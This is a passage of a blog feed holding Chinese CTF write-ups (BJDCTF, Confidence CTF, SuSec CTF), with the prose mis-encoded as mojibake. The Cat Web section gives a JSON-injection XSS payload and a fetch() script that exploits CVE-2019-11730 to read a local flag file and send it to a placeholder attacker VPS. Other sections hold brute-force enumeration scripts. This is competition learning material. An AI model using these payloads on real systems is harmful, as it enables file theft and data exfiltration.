class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">aesEn</span>(<span class="params">$data, $key</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $method = <span class="string">&#x27;AES-128-CBC&#x27;</span>;</span><br><span class="line">    $iv = md5(<span class="string">&#x27;174.0.222.75&#x27;</span>,<span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">return</span>  base64_encode(openssl_encrypt($data, $method,$key, OPENSSL_RAW_DATA , $iv));</span><br><span class="line">&#125;</span><br><span class="line">$cipher = aesEn($data, <span class="string">&#x27;y1ng&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> $cipher;</span><br></pre></td></tr></table></figure><p><img src="/2020/03/21/BJDCTF-2rd-writeup/TIM%E6%88%AA%E5%9B%BE20200323160910.png"></p><h3 id="elementmaster"><a href="#elementmaster" class="headerlink" title="elementmaster"></a>elementmaster</h3><p>é¢˜ç›®æœ‰è¿™ä¸¤è¡Œä»£ç </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;p hidden id&#x3D;&quot;506F2E&quot;&gt;I am the real Element Masterrr!!!!!!&lt;&#x2F;p&gt;</span><br><span class="line">&lt;p hidden id&#x3D;&quot;706870&quot;&gt;@é¢–å¥‡L&#39;Amore&lt;&#x2F;p&gt;</span><br></pre></td></tr></table></figure><p><code>506F2E706870</code>åå…­è¿›åˆ¶è½¬å­—ç¬¦å¾—åˆ°<code>Po.php</code>ï¼Œæˆ‘å“­äº†ã€‚ã€‚ã€‚</p><p>Poæ˜¯ä¸€ä¸ªåŒ–å­¦å…ƒç´ ï¼Œåˆšå¥½å’Œé¢˜ç›®çš„å›¾ç›¸å…³ï¼Œç”¨åŒ–å­¦å…ƒç´ è·‘</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">s=<span class="string">&#x27;H, He, Li, Be, B, C, N, O, F, Ne, Na, Mg, Al, Si, P, S, Cl, Ar,K, Ca, Sc, Ti, V, Cr, Mn, Fe, Co, Ni, Cu, Zn, Ga, Ge, As, Se, Br, Kr, Rb, Sr, Y, Zr, Nb, Mo, Te, Ru, Rh, Pd, Ag, Cd, In, Sn, Sb, Te, I, Xe, Cs, Ba, La, Ce, Pr, Nd, Pm, Sm, Eu, Gd, Tb, Dy, Ho, Er, Tm, Yb, Lu, Hf, Ta, W, Re, Os, Ir, Pt, Au, Hg, Tl, Pb, Bi, Po, At, Rn, Fr, Ra, Ac, Th, Pa, U, Np, Pu, Am, Cm, Bk, Cf, Es, Fm,Md, No, Lr,Rf, Db, Sg, Bh, Hs, Mt, Ds, Rg, Cn, Nh, Fl, Mc, Lv, Ts, Og, Uue&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s.split(<span class="string">&#x27;, &#x27;</span>):</span><br><span class="line">    r=requests.get(<span class="string">&#x27;http://04302ff8-21bd-4bbb-86b9-401e9978d758.node3.buuoj.cn/&#123;&#125;.php&#x27;</span>.format(i))</span><br><span class="line">    <span class="comment"># print(i)</span></span><br><span class="line">    <span class="keyword">if</span> r.status_code==<span class="number">200</span>:</span><br><span class="line">        print(r.text,end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><p>è·‘å®Œå¾—åˆ°<code>And_th3_3LemEnt5_w1LL_De5tR0y_y0u.php</code>ï¼Œè®¿é—®å¾—åˆ°flag</p><h3 id="SchroÌˆdinger"><a href="#SchroÌˆdinger" class="headerlink" title="SchroÌˆdinger"></a>SchroÌˆdinger</h3><p>æŠ“åŒ…ï¼Œå‘ç°postè¯·æ±‚å¾—æ—¶ä¾¯ä¸€ç›´æœ‰set_cookieï¼Œå¹¶ä¸”å‰å‡ ä½ä¸å˜</p><p>base64è§£å¯†å¾—åˆ°çº¯æ•°å­—ï¼Œåˆšå¥½æ˜¯Unixæ—¶é—´æˆ³ï¼Œä¸æ‡‚ï¼Œè¿™æ ·æ„é€ flagå°±åœ¨é‚£ä¸ªè§†é¢‘è¯„è®ºé‡Œ</p><p><img src="/2020/03/21/BJDCTF-2rd-writeup/TIM%E6%88%AA%E5%9B%BE20200324174737.png"></p><p>å‚è€ƒï¼š</p><p><a href="https://blog.csdn.net/IOT2017/article/details/84069882">https://blog.csdn.net/IOT2017/article/details/84069882</a></p><p><a href="https://segmentfault.com/a/1190000015886194?utm_source=tag-newest">https://segmentfault.com/a/1190000015886194?utm_source=tag-newest</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> writeup </tag>
            
            <tag> BJDCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTFtimeåšé¢˜è®°å½•</title>
      <link href="2020/03/18/ctf-time%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
      <url>2020/03/18/ctf-time%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<p>æœ¬ç¯‡åšå®¢ä¸»è¦ä»‹ç»äº†è‡ªå·±é—²æ¥æ— äº‹åœ¨ctf-timeåšé¢˜çš„è®°å½•ï¼</p><a id="more"></a><h2 id="Confidence-CTF"><a href="#Confidence-CTF" class="headerlink" title="Confidence CTF"></a>Confidence CTF</h2><h3 id="web"><a href="#web" class="headerlink" title="web"></a>web</h3><h4 id="Cat-Web"><a href="#Cat-Web" class="headerlink" title="Cat Web"></a>Cat Web</h4><p>é¢˜ç›®åœ°å€ï¼š<a href="http://catweb.zajebistyc.tf/">http://catweb.zajebistyc.tf/</a></p><p>æŸ¥çœ‹æºä»£ç ï¼Œå‘ç°å¯ä»¥æ‰¾åˆ°flagçš„ä½ç½®</p><img src="/2020/03/18/ctf-time%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/TIMæˆªå›¾20200319190036.png" style="zoom:80%;"><p>æºä»£ç å‘ç°æœ‰reportåŠŸèƒ½ï¼Œå°è¯•ç»™ä¸ªurlå‘ç°ä¼šè®¿é—®</p><img src="/2020/03/18/ctf-time%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/TIMæˆªå›¾20200319190505.png" style="zoom:80%;"><p>Firefox/67.0è¿™ä¸ªä¿¡æ¯ç»™å¾ˆé‡è¦ï¼Œè¿™é¢˜è€ƒå¯Ÿçš„å°±æ˜¯FireFoxçš„ä¸€ä¸ªcve</p><p>CVE-2019-11730ï¼ŒPOCåœ°å€ï¼š<a href="https://github.com/alidnf/CVE-2019-11730">https://github.com/alidnf/CVE-2019-11730</a></p><p>åˆ©ç”¨è¿™ä¸ªæ¼æ´æˆ‘ä»¬å¯ä»¥ä»»æ„æ–‡ä»¶è¯»å–ï¼Œå…ˆçœ‹ä¸‹æºç </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getNewCats</span>(<span class="params">kind</span>) </span>&#123;</span><br><span class="line">$.getJSON(<span class="string">&#x27;http://catweb.zajebistyc.tf/cats?kind=&#x27;</span>+kind, <span class="function"><span class="keyword">function</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line"><span class="keyword">if</span>(data.status != <span class="string">&#x27;ok&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">$(<span class="string">&#x27;#cats_container&#x27;</span>).empty();</span><br><span class="line">cats = data.content;</span><br><span class="line">cats.forEach(<span class="function"><span class="keyword">function</span>(<span class="params">cat</span>) </span>&#123;</span><br><span class="line"><span class="keyword">var</span> newDiv = <span class="built_in">document</span>.createElement(<span class="string">&#x27;div&#x27;</span>);</span><br><span class="line">newDiv.innerHTML = <span class="string">&#x27;&lt;img style=&quot;max-width: 200px; max-height: 200px&quot; src=&quot;static/&#x27;</span>+kind+<span class="string">&#x27;/&#x27;</span>+cat+<span class="string">&#x27;&quot; /&gt;&#x27;</span>;</span><br><span class="line">$(<span class="string">&#x27;#cats_container&#x27;</span>).append(newDiv);</span><br><span class="line">&#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">$(<span class="built_in">document</span>).ready(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">$(<span class="string">&#x27;#cat_select&#x27;</span>).change(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">var</span> kind = $(<span class="built_in">this</span>).val();</span><br><span class="line">history.pushState(&#123;&#125;, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;?&#x27;</span>+kind)</span><br><span class="line">getNewCats(kind);</span><br><span class="line">&#125;);</span><br><span class="line"><span class="keyword">var</span> kind = <span class="built_in">window</span>.location.search.substring(<span class="number">1</span>);</span><br><span class="line"><span class="keyword">if</span>(kind == <span class="string">&quot;&quot;</span>)</span><br><span class="line">&#123;</span><br><span class="line">kind = <span class="string">&#x27;black&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">getNewCats(kind);</span><br><span class="line">&#125;);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>å½“æˆ‘ä»¬åˆ‡æ¢çŒ«çš„é¢œè‰²çš„æ—¶å€™å°±ä¼šåƒæœåŠ¡ç«¯å‘é€è¯·æ±‚è·å¾—å›¾ç‰‡çš„åç§°</p><img src="/2020/03/18/ctf-time%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/TIMæˆªå›¾20200319215249.png" style="zoom:80%;"><p>å¦‚æœæˆ‘ä»¬æœç´¢ç°çŒ«ï¼Œåˆ™å›¾åƒçš„è·¯å¾„ä¸º<code>static/grey/1.jpg</code>ï¼Œå› æ­¤kindï¼ˆgreyï¼‰æ˜¯æ–‡ä»¶å¤¹ï¼Œæ‰€æœ‰æˆ‘ä»¬å‰é¢çš„ç›®å½•éå†æ‰æˆç«‹</p><p>å½“æˆ‘ä»¬ä¸è®¾é¢œè‰²å‚æ•°æ—¶,å°±ä¼šæˆªå–?åé¢çš„ä¸œè¥¿ä½œä¸ºkindï¼Œå¦‚æœä¸ºç©ºåˆ™kindä¸ºblackï¼Œæˆ‘ä»¬ç¬¬ä¸€æ¬¡æ‰“å¼€å°±æ˜¯black</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> kind = <span class="built_in">window</span>.location.search.substring(<span class="number">1</span>);</span><br><span class="line"><span class="keyword">if</span>(kind == <span class="string">&quot;&quot;</span>)</span><br><span class="line">&#123;</span><br><span class="line">kind = <span class="string">&#x27;black&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åˆ‡æ¢é¢œè‰²è¯·æ±‚çš„æ˜¯</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;catweb.zajebistyc.tf&#x2F;cats?kind&#x3D;</span><br></pre></td></tr></table></figure><p>è¿”å›çš„ç»“æœéƒ½ä¼šè¢«åµŒå…¥åˆ°ç½‘é¡µä¸­</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">newDiv.innerHTML = &#x27;<span class="tag">&lt;<span class="name">img</span> <span class="attr">style</span>=<span class="string">&quot;max-width: 200px; max-height: 200px&quot;</span> <span class="attr">src</span>=<span class="string">&quot;static/&#x27;+kind+&#x27;/&#x27;+cat+&#x27;&quot;</span> /&gt;</span>&#x27;;</span><br></pre></td></tr></table></figure><p>è¯•ç€å¼¹ä¸ªæ¡†</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;?&quot;,&quot;content&quot;:[&quot;\&quot;&gt;&lt;script&gt;alert(1)&lt;&#x2F;script&gt;&quot;],&quot;status&quot;:&quot;ok&quot;,&quot;a&quot;:&quot;</span><br></pre></td></tr></table></figure><img src="/2020/03/18/ctf-time%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/TIMæˆªå›¾20200319222908.png" style="zoom:80%;"><p>åˆ†æä¸€ä¸‹ï¼Œå¯ä»¥çœ‹åˆ°è¿™é‡Œéå†äº†contentçš„å†…å®¹</p><p><img src="/2020/03/18/ctf-time%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/TIM%E6%88%AA%E5%9B%BE20200319230144.png"></p><p>çœ‹ä¸‹æ³¨å…¥åçš„æºç ï¼Œå‘ç°</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(1)&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><p>ä»é‡Œé¢é€ƒé€¸å‡ºæ¥äº†ï¼Œè¿™æ˜¯å› ä¸ºæˆ‘ä»¬ç”¨<code>\&quot;&gt;</code>å°†å‰é¢é—­åˆäº†</p><img src="/2020/03/18/ctf-time%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/TIMæˆªå›¾20200319231116.png" style="zoom:80%;"><p>å› æ­¤æˆ‘ä»¬å¯ä»¥æ„é€ å¦‚ä¸‹payloadè¿›è¡Œjsonæ³¨å…¥:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;, &quot;content&quot;: [&quot;\&quot;&gt;&lt;script src&#x3D;&#39;https:&#x2F;&#x2F;youvps.com&#x2F;xss.js&#39;&gt;&lt;&#x2F;script&gt;&quot;], &quot;status&quot;: &quot;ok&quot;, &quot;a&quot;: &quot;</span><br></pre></td></tr></table></figure><p>äº¤ç»™æœåŠ¡ç«¯ï¼Œxss.jså†™çš„æ˜¯ï¼Œåˆ©ç”¨çš„å°±æ˜¯é‚£ä¸ªCVE</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fetch(<span class="string">&#x27;file:///app/templates/flag.txt&#x27;</span>).then(<span class="function"><span class="params">response</span> =&gt;</span> response.text()).then(<span class="function">(<span class="params">response</span>) =&gt;</span> &#123;<span class="built_in">window</span>.location = <span class="string">&#x27;https://yourvps/?a=&#x27;</span> + (btoa(response) || <span class="string">&#x27;No Value&#x27;</span>)&#125;);</span><br></pre></td></tr></table></figure><p>é¢æ¡ˆåæˆ‘ä»¬å‘æœåŠ¡ç«¯reportï¼Œå¾—åˆ°flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file:&#x2F;&#x2F;&#x2F;app&#x2F;templates&#x2F;index.html?&quot;, &quot;content&quot;: [&quot;\&quot;&gt;&lt;script src&#x3D;&#39;http:&#x2F;&#x2F;yourvps&#x2F;xss.js&#39;&gt;&lt;&#x2F;script&gt;&quot;], &quot;status&quot;: &quot;ok&quot;, &quot;a&quot;: &quot;</span><br></pre></td></tr></table></figure><img src="/2020/03/18/ctf-time%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/TIMæˆªå›¾20200319213940.png" style="zoom:80%;"><h3 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h3><h4 id="Hidden-Flag"><a href="#Hidden-Flag" class="headerlink" title="Hidden Flag"></a>Hidden Flag</h4><p>é¢˜ç›®æç¤ºflagç±»ä¼¼äº<code>p4&#123;letters_digits_and_special_characters&#125;</code></p><p>æ‰“å¼€é¢˜ç›®æœäº†æœå‘ç°æ˜¯Yara</p><p>å‚è€ƒï¼š<a href="https://bbs.pediy.com/thread-226011.htm">https://bbs.pediy.com/thread-226011.htm</a></p><p>å› æ­¤æˆ‘ä»¬å¯ä»¥æ„é€ ä¸‹é¢çš„</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">rule GambitWildcard</span><br><span class="line">&#123;</span><br><span class="line">    strings:</span><br><span class="line">       $hex_string &#x3D; &#123; 70 34 7B &#125;</span><br><span class="line"> </span><br><span class="line">    condition:</span><br><span class="line">       $hex_string</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2020/03/18/ctf-time%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/TIM%E6%88%AA%E5%9B%BE20200318233751.png"></p><p>å‘ç°åŒ¹é…åˆ°flagäº†ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥å°è¯•çˆ†ç ´flagï¼Œè‡ªå·±å†™çš„çƒ‚exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line">url1=<span class="string">&quot;http://hidden.zajebistyc.tf/api/query/medium&quot;</span></span><br><span class="line">url2=<span class="string">&quot;http://hidden.zajebistyc.tf/api/matches/&#123;&#125;?offset=0&amp;limit=50&quot;</span></span><br><span class="line">proxies=&#123;<span class="string">&#x27;https&#x27;</span>:<span class="string">&#x27;https://127.0.0.1:8080&#x27;</span>,<span class="string">&#x27;http&#x27;</span>:<span class="string">&#x27;http://127.0.0.1:8080&#x27;</span>&#125;</span><br><span class="line">tr=string.ascii_letters+string.digits+string.punctuation</span><br><span class="line">headers=&#123;</span><br><span class="line"><span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0&quot;</span>,</span><br><span class="line"><span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;application/json, text/plain, */*&quot;</span>,</span><br><span class="line"><span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&quot;</span>,</span><br><span class="line"><span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate&quot;</span>,</span><br><span class="line"><span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/json;charset=utf-8&quot;</span>,</span><br><span class="line"><span class="string">&quot;Origin&quot;</span>: <span class="string">&quot;https://hidden.zajebistyc.tf&quot;</span>,</span><br><span class="line"><span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span>,</span><br><span class="line"><span class="string">&quot;Cookie&quot;</span>: <span class="string">&quot;__cfduid=ddf850d29ca9e31ba29e0e9bf15986bd01584235270&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">flag=<span class="string">&quot;p4&#123;ind3x1ng-l3ak5&#125;&quot;</span></span><br><span class="line"><span class="comment"># data=r&#x27;&#x27;&#x27;&#123;&quot;raw_yara\&quot;:\&quot;rule ASCIIFatTony\\n\&#123;\\n    strings:\\n        $a = \&#123;&#123;&#125;\&#125;\\n \\n    condition:\\n       \$a\\n\&#125;\&quot;,\&quot;method\&quot;:\&quot;query\&quot;&#125;&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getflag</span>(<span class="params">s,flag</span>):</span></span><br><span class="line">key=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">s1=<span class="string">&#x27; &#x27;</span>+hex(ord(s)).replace(<span class="string">&quot;0x&quot;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">data1 = <span class="string">&#x27;&#x27;&#x27;&#123;&quot;raw_yara&quot;:&quot;rule ASCIIFatTony\\n&#123;\\n    strings:\\n        $a = &#123;70 34 7b 69 6e 64 33 78 31 6e 67 2d 6c 33 61 6b 35&#x27;&#x27;&#x27;</span>+s1+<span class="string">&#x27;&#x27;&#x27;&#125;\\n \\n    condition:\\n       $a\\n&#125;&quot;,&quot;method&quot;:&quot;query&quot;&#125;&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># print(data1)</span></span><br><span class="line">r=requests.post(url1,data=data1,headers=headers,proxies=proxies)</span><br><span class="line">key=re.match(<span class="string">r&quot;\&#123;\&quot;query_hash\&quot;:\&quot;(.+)\&quot;\&#125;&quot;</span>,r.text).group(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">url3=url2.format(key)</span><br><span class="line">r=requests.get(url3,headers=headers,proxies=proxies)</span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;/opt/bin/getflag&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">print(<span class="string">&quot;[+] find!!!&quot;</span>)</span><br><span class="line">flag=flag+s</span><br><span class="line">print(s+<span class="string">&quot;   &quot;</span>+hex(ord(s)).replace(<span class="string">&quot;0x&quot;</span>,<span class="string">&#x27;&#x27;</span>))</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> tr:</span><br><span class="line">threading.Thread(target=getflag,args=(i,flag,)).start()</span><br></pre></td></tr></table></figure><h2 id="SuSec-CTF"><a href="#SuSec-CTF" class="headerlink" title="SuSec CTF"></a>SuSec CTF</h2><h3 id="misc-1"><a href="#misc-1" class="headerlink" title="misc"></a>misc</h3><h4 id="Secure-note"><a href="#Secure-note" class="headerlink" title="Secure note"></a>Secure note</h4><p>é¢˜ç›®çš„æ„æ€æ˜¯æˆ‘ä»¬å¯ä»¥curlçš„æ”¾å¼æ¥å®Œæˆè¯·æ±‚</p><p><img src="/2020/03/18/ctf-time%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/TIM%E6%88%AA%E5%9B%BE20200320212641.png"></p><p>æˆ‘ä»¬æ‰¾åˆ°adminç”¨æˆ·ï¼ŒæŸ¥çœ‹ä»–çš„note</p><img src="/2020/03/18/ctf-time%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/TIMæˆªå›¾20200320212845.png" style="zoom:80%;"><p>å‘ç°å¥½åƒæ˜¯æœ‰è§„å¾‹çš„ï¼Œç¬¬ä¸€æ—¶é—´æƒ³åˆ°äº†çˆ†ç ´</p><p>æˆ‘ä»¬å¯ä»¥æ„é€ </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Xkva&#123;1&#125;&#123;2&#125;rqXd6tZvr&#123;3&#125;</span><br></pre></td></tr></table></figure><p>1ä½ç½®åº”è¯¥åœ¨w-4ä¹‹é—´ï¼Œ3ä½ç½®åœ¨H-Tä¹‹é—´ï¼Œexp:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import string</span><br><span class="line">from concurrent.futures import ThreadPoolExecutor</span><br><span class="line"></span><br><span class="line">proxies &#x3D; &#123;</span><br><span class="line">  &quot;http&quot;: &quot;http:&#x2F;&#x2F;127.0.0.1:8080&quot;,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">def req(url):</span><br><span class="line">print(url)</span><br><span class="line">try:</span><br><span class="line">r&#x3D;requests.get(url)</span><br><span class="line">if r.status_code&#x3D;&#x3D;200:</span><br><span class="line">print(r.text)</span><br><span class="line">exit(0)</span><br><span class="line">except Exception as e:</span><br><span class="line">pass</span><br><span class="line"></span><br><span class="line">url&#x3D;&quot;http:&#x2F;&#x2F;69.90.132.70:1339&#x2F;paste&#x2F;Xkva&#123;&#125;&#123;&#125;rqXd6tZvr&#123;&#125;&quot;</span><br><span class="line">tr&#x3D;string.digits+string.ascii_letters</span><br><span class="line">li&#x3D;[]</span><br><span class="line">for i in &#39;01234&#39;:</span><br><span class="line">for j in tr:</span><br><span class="line">for k in &#39;IJKLMNOPQRST&#39;:</span><br><span class="line">li.append(url.format(i,j,k))</span><br><span class="line">p &#x3D; ThreadPoolExecutor(3)</span><br><span class="line">for u in li:</span><br><span class="line">p.submit(req,u)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æœ€åè·‘å‡ºæ¥æ˜¯</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Xkva2arqXd6tZvrP</span><br></pre></td></tr></table></figure><h4 id="Little"><a href="#Little" class="headerlink" title="Little"></a>Little</h4><p>è¿™é¢˜å·®ç‚¹å°±å¼„å‡ºæ¥äº†</p><p>binwalk åˆ†ç¦»å‡º secondf.png å’Œ 0.extï¼Œå¾—åˆ°<code>tO_7h3_3nd_Of_</code>:</p><p><img src="/2020/03/18/ctf-time%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/2.png" alt="img"></p><p>little.img æ–‡ä»¶ç”¨ DiskGenius æ‰“å¼€å¾—åˆ° FIRSTF.KGB</p><p><img src="/2020/03/18/ctf-time%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/3.png" alt="img"></p><p>å†ç”¨ KGB Archiver æå– FIRSTF.KGB å¾—åˆ° firstf.oggï¼Œæ’­æ”¾å£°éŸ³æ˜¯ <code>c0me_wi4h_f4t_m4n_</code></p><p>flagåº”è¯¥è¿˜æœ‰ä¸€æ®µ</p><p>ç”¨AutopsyæŸ¥çœ‹ä»¥ä¸‹åˆ é™¤çš„æ•°æ®ï¼Œæ–°å»ºä¸€ä¸ªå®ä¾‹</p><img src="/2020/03/18/ctf-time%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/TIMæˆªå›¾20200319001419.png" style="zoom:80%;"> <p>é€‰æ‹©å·¥ä½œç›®å½•ï¼Œéšæ„é€‰æ‹©å°±è¡Œï¼Œä¸‹ä¸€æ­¥ï¼Œç„¶åå®Œæˆ</p><img src="/2020/03/18/ctf-time%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/TIMæˆªå›¾20200319001525.png" style="zoom:80%;"><p>Add Data Sourceæ·»åŠ little.imgï¼Œé€‰æ‹©Unallocated Space Image File</p><img src="/2020/03/18/ctf-time%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/TIMæˆªå›¾20200319001924.png" style="zoom:80%;"><p>ç„¶åä¸‹ä¸€æ­¥ä¸‹ä¸€æ­¥ï¼Œå®Œæˆå°±è¡Œï¼Œçœ‹åˆ°MP4å³é”®å¯¼å‡º</p><img src="/2020/03/18/ctf-time%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/TIMæˆªå›¾20200319002143.png" 